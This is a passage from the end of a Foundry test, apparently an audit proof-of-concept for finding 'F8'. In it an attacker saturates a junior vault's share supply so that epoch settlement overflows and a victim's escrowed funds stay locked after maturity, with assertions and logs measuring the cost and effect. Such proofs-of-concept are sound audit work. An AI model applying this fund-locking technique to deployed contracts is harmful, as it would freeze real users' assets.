        assertEq(settlementToken.balanceOf(ATTACKER), attackerWalletAfterRecovery);

        vm.warp(victimMaturity + 25 hours + 30 seconds);
        assertGt(block.timestamp - victimMaturity, 24 hours, "competition freeze threshold");
        assertFalse(engine.isOracleFrozen());
        assertGt(juniorVault.totalAssets(), 0);
        vm.prank(ATTACKER);
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x11)));
        pool.settleLpEpoch(0, 0);
        _assertVictimLocked(victimEpoch, victimAssets, escrowAssets);
        assertEq(settlementToken.balanceOf(address(pool)), poolCashBeforeFailure);
        assertEq(settlementToken.balanceOf(ATTACKER), attackerWalletAfterRecovery);
        assertEq(juniorVault.pendingDepositRequest(blockerEpoch, ATTACKER), 1e6);

        uint256 attackerGrossFunding = initialFunding + amplificationFunding + finalJuniorDeposit + 1e6;
        console2.log("F8 attacker gross funded atoms", attackerGrossFunding);
        console2.log("F8 attacker Senior recovered atoms", seniorRecovered);
        console2.log("F8 attacker gross less Senior cash atoms", attackerGrossFunding - seniorRecovered);
        console2.log("F8 attacker wallet atoms", attackerWalletAfterRecovery);
        console2.log("F8 attacker Junior shares", attackerJuniorShares);
        console2.log("F8 attacker Junior quote before blocker atoms", attackerJuniorQuote);
        console2.log("F8 residual Senior/Junior principal atoms", pool.seniorPrincipal(), pool.juniorPrincipal());
        console2.log("F8 Junior share supply", nearMaxSupply);
        console2.log("F8 blocker finite share quote", blockerQuote);
        console2.log("F8 remaining share headroom", headroom);
        console2.log("F8 victim escrow atoms", victimAssets);
        console2.log("F8 victim-alone quote overflow at same saturated supply", true);
        console2.log("F8 victim locked seconds after maturity", block.timestamp - victimMaturity);
        console2.log("F8 simulated setup elapsed seconds", victimMaturity - SETUP_TIMESTAMP);
    }

}
```
